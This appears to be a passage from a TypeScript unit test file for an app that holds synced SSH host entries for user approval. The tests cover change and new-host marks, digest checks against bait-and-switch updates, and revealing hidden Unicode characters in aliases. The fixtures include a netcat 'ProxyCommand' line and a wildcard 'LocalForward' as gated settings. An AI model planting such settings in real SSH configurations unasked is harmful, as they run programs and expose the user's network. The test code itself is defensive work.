    expect(adoption.changed).toEqual([ref(db3)]);
    expect(adoption.added).toEqual([]);
  });

  it("marks a host that was not on screen as new, and leaves hosts that did not change alone", () => {
    const adoption = adoptNewest([web1, db2], [web1, db2, nas], new Map(), []);
    expect(adoption.marks).toEqual(new Map([[key(nas), "new"]]));
    expect(adoption.added).toEqual([ref(nas)]);
    expect(adoption.changed).toEqual([]);
  });

  it("keeps a mark, without announcing it again, until the user decides on that host", () => {
    const marks = new Map([[key(db3), "changed" as const]]);
    // Another refresh, or "Show them", with nothing new: the mark stays and nothing is announced.
    const again = adoptNewest([db3], [db3], marks, []);
    expect(again.marks).toEqual(marks);
    expect(again.changed).toEqual([]);
    // Deciding on the host ends its mark whatever else the list does: gone from it, or still listed as it was.
    expect(adoptNewest([db3, web1], [web1], marks, [db3]).marks).toEqual(new Map());
    expect(adoptNewest([db3], [db3], marks, [db3]).marks).toEqual(new Map());
    // A host that changed once more is announced again.
    const db5 = pending({ alias: "db", digest: "d5" });
    expect(adoptNewest([db3], [db5], marks, []).changed).toEqual([ref(db5)]);
  });

  it("keeps the mark when the decision did not go through (the host is not decided)", () => {
    const marks = new Map([[key(db3), "changed" as const]]);
    expect(adoptNewest([db3], [db3], marks, []).marks).toEqual(marks);
  });

  it("calls a decided host that comes back with other content new, and a new host that changes again changed", () => {
    const web9 = pending({ digest: "d9" });
    const back = adoptNewest([web1], [web9], new Map(), [web1]);
    expect(back.marks).toEqual(new Map([[key(web9), "new"]]));
    expect(back.added).toEqual([ref(web9)]);

    // `nas` arrived after the review opened (marked new), then changed again: the newer statement is the one that counts.
    const nas7 = pending({ alias: "nas", digest: "d7" });
    const grown = adoptNewest([web1, nas], [web1, nas7], new Map([[key(nas), "new" as const]]), []);
    expect(grown.marks).toEqual(new Map([[key(nas7), "changed"]]));
    expect(grown.changed).toEqual([ref(nas7)]);
  });

  it("tells hosts with the same alias in different spaces apart", () => {
    const elsewhere = pending({ space_id: "p".repeat(64), space_name: "Personal", digest: "d8" });
    const adoption = adoptNewest([web1, elsewhere], [web1, pending({ space_id: "p".repeat(64), space_name: "Personal", digest: "d9" })], new Map(), []);
    expect([...adoption.marks.keys()]).toEqual([hostKey("p".repeat(64), "web")]);
    expect(adoption.changed.map((h) => h.spaceName)).toEqual(["Personal"]);
  });

  it("follows the bait and switch through a whole decision, and the next approval sends the version now on screen", async () => {
    const shown = [web1, db2];
    // The user approves web; the backend has db at d3 by now.
    const results = await runDecision(approvalGroups([web1]), async () => ({ applied: 1, changed: [], overview: overview() }));
    const { applied, decided, changed } = combineOutcomes(results);
    expect(applied).toBe(1);
    const adoption = adoptNewest(shown, [db3], new Map(), decided);
    expect(changedNotice([...changed, ...adoption.changed], adoption.added)).toBe("db in Work changed since you opened this — review it again.");
    expect(adoption.marks.get(key(db3))).toBe("changed");

    // Approving db now sends exactly the digest of what the card shows (d3, not the d2 seen first); the mark ends with the decision.
    const sent: unknown[] = [];
    const second = await runDecision(approvalGroups([db3]), async (_spaceId, approvals) => {
      sent.push(approvals);
      return { applied: 1, changed: [], overview: overview() };
    });
    expect(sent).toEqual([[{ alias: "db", digest: "d3" }]]);
    expect(adoptNewest([db3], [], adoption.marks, combineOutcomes(second).decided).marks).toEqual(new Map());
  });

  it("words the mark for the card", () => {
    expect(markText("changed")).toBe("Changed since you opened this — review it again");
    expect(markText("new")).toBe("New since you opened this");
  });
});

describe("isSettled", () => {
  it("waits for a refetch in progress: a cached list the mount refetch is replacing can be out of date, even empty", () => {
    expect(isSettled({ isSuccess: true, isFetching: true })).toBe(false); // a re-opened dialog: stale cache, refetch under way
    expect(isSettled({ isSuccess: false, isFetching: true })).toBe(false); // first load
    expect(isSettled({ isSuccess: false, isFetching: false })).toBe(false); // the refetch failed: no list to trust
    expect(isSettled({ isSuccess: true, isFetching: false })).toBe(true);
  });
});

describe("adoptAtOnce", () => {
  const web = pending();
  const db = pending({ alias: "db", digest: "d2" });

  it("is for hosts that arrive while nothing is on screen: there is no version to keep in place", () => {
    expect(adoptAtOnce([], [web])).toBe(true);
    expect(adoptAtOnce([web], [web, db])).toBe(false); // something is on screen: the user decides when to see the rest
    expect(adoptAtOnce([], [])).toBe(false);
    expect(adoptAtOnce([web], [])).toBe(false);
  });

  it("marks what it adopts as new and names it with its space", () => {
    const adoption = adoptNewest([], [web, db], new Map(), []);
    expect([...adoption.marks.values()]).toEqual(["new", "new"]);
    expect(changedNotice(adoption.changed, adoption.added)).toBe("web in Work, db in Work are new since you opened this — review them.");
  });
});

describe("listMoved", () => {
  const nothing: AboveList = { lock: null, notice: null, newer: false };
  const lock = "Enter the new sync code first.";
  const notice = "web in Work changed since you opened this — review it again.";

  it("says the list moved when the lock paragraph goes away: the buttons it kept off come back in the render that shifts the list", () => {
    expect(listMoved({ ...nothing, lock }, nothing)).toBe(true);
  });

  it("says it moved when the lock paragraph appears, or says something else (a longer text wraps)", () => {
    expect(listMoved(nothing, { ...nothing, lock })).toBe(true);
    expect(listMoved({ ...nothing, lock }, { ...nothing, lock: "Wait for the new sync code to be in place first." })).toBe(true);
  });

  it("says it moved when the notice paragraph appears, goes away or changes its text", () => {
    expect(listMoved(nothing, { ...nothing, notice })).toBe(true);
    expect(listMoved({ ...nothing, notice }, nothing)).toBe(true);
    expect(listMoved({ ...nothing, notice }, { ...nothing, notice: `${notice} db in Work is new since you opened this — review it.` })).toBe(true);
  });

  it("says it moved when the 'Newer versions arrived' banner appears or goes away", () => {
    expect(listMoved(nothing, { ...nothing, newer: true })).toBe(true);
    expect(listMoved({ ...nothing, newer: true }, nothing)).toBe(true);
  });

  it("says it did not while what sits above the list is the same", () => {
    expect(listMoved(nothing, nothing)).toBe(false);
    expect(listMoved({ lock, notice, newer: true }, { lock, notice, newer: true })).toBe(false);
  });

  it("notices one change among unchanged paragraphs", () => {
    expect(listMoved({ lock, notice, newer: false }, { lock, notice, newer: true })).toBe(true);
    expect(listMoved({ lock, notice, newer: true }, { lock: null, notice, newer: true })).toBe(true);
    expect(listMoved({ lock, notice, newer: true }, { lock, notice: null, newer: true })).toBe(true);
  });
});

describe("approvalMessage", () => {
  it("names a single host, counts several, and stays quiet for none", () => {
    expect(approvalMessage([{ space_id: "a", space_name: "Work", aliases: ["web"] }])?.title).toBe("web needs your approval");
    expect(
      approvalMessage([
        { space_id: "a", space_name: "Work", aliases: ["web", "db"] },
        { space_id: "b", space_name: "Personal", aliases: ["nas"] },
      ]),
    ).toEqual({
      title: "3 synced hosts need your approval",
      description:
        "They came from another computer with settings that run programs (on this computer or on the server), share your credentials, environment or network, or relax host-key checks. Nothing changes until you approve them.",
    });
    expect(approvalMessage([])).toBeNull();
  });

  it("speaks of one host in the singular", () => {
    expect(approvalMessage([{ space_id: "a", space_name: "Work", aliases: ["web"] }])).toEqual({
      title: "web needs your approval",
      description:
        "It came from another computer with settings that run programs (on this computer or on the server), share your credentials, environment or network, or relax host-key checks. Nothing changes until you approve it.",
    });
  });

  it("reveals hidden characters in the alias it names", () => {
    expect(approvalMessage([{ space_id: "a", space_name: "Work", aliases: ["we\u{202E}b"] }])?.title).toBe("we⟨U+202E⟩b needs your approval");
    expect(approvalMessage([{ space_id: "a", space_name: "Work", aliases: ["we\u{3164}b"] }])?.title).toBe("we⟨U+3164⟩b needs your approval");
  });
});

describe("what makes a synced host wait, said once", () => {
  it("is one phrase in the toast, the Review row and the review dialog", () => {
    expect(GATED_SETTINGS).toBe(
      "settings that run programs (on this computer or on the server), share your credentials, environment or network, or relax host-key checks",
    );
    expect(approvalMessage([{ space_id: "a", space_name: "Work", aliases: ["web"] }])?.description).toContain(GATED_SETTINGS);
    expect(approvalsRowNote(null)).toContain(GATED_SETTINGS);
    expect(REVIEW_INTRO).toContain(GATED_SETTINGS);
  });

  it("gives the Review row's description, with the reason Review is off when there is one", () => {
    expect(approvalsRowNote(null)).toBe(`They bring ${GATED_SETTINGS}. Nothing changes until you approve them.`);
    expect(approvalsRowNote("Enter the new sync code first.")).toBe(
      `They bring ${GATED_SETTINGS}. Nothing changes until you approve them. Enter the new sync code first.`,
    );
  });

  it("introduces the review: nothing is applied until approved, and rejecting sends nothing back", () => {
    expect(REVIEW_INTRO).toBe(
      `These hosts came from your other computers with ${GATED_SETTINGS}. Nothing is applied until you approve it. Rejecting keeps this computer's version and sends nothing back.`,
    );
  });
});

describe("the lines of a block", () => {
  it("drops one trailing newline and one CR per line, for display and for marking alike", () => {
    const text = "Host web\r\n  ProxyCommand nc %h 22\r\n";
    expect(displayLines(text)).toEqual(["Host web", "  ProxyCommand nc %h 22"]);
    const view = pending({ text });
    expect(blockLines(view).map((line) => line.text)).toEqual(["Host web", "  ProxyCommand nc %h 22"]);
    // A block without a final newline, and a blank line inside it, keep their shape.
    expect(displayLines("Host web\n\n  User root")).toEqual(["Host web", "", "  User root"]);
  });

  it("reads a keyword the same way when it marks a line and when it cuts a signature's value", () => {
    // `Keyword=value`, `Keyword = value`, tabs: the same keyword, and the value is what a signature holds.
    for (const line of ["  LocalForward *:8080 host:80", "\tLocalForward=*:8080 host:80", "LocalForward  =  *:8080 host:80"]) {
      const view = pending({
        text: `Host web\n${line}\n`,
        incoming: { host: "web", gated: [{ keyword: "localforward", value: "*:8080 host:80" }] },
      });
      expect(blockLines(view)[1].gated, line).toBe(true);
    }
  });
});
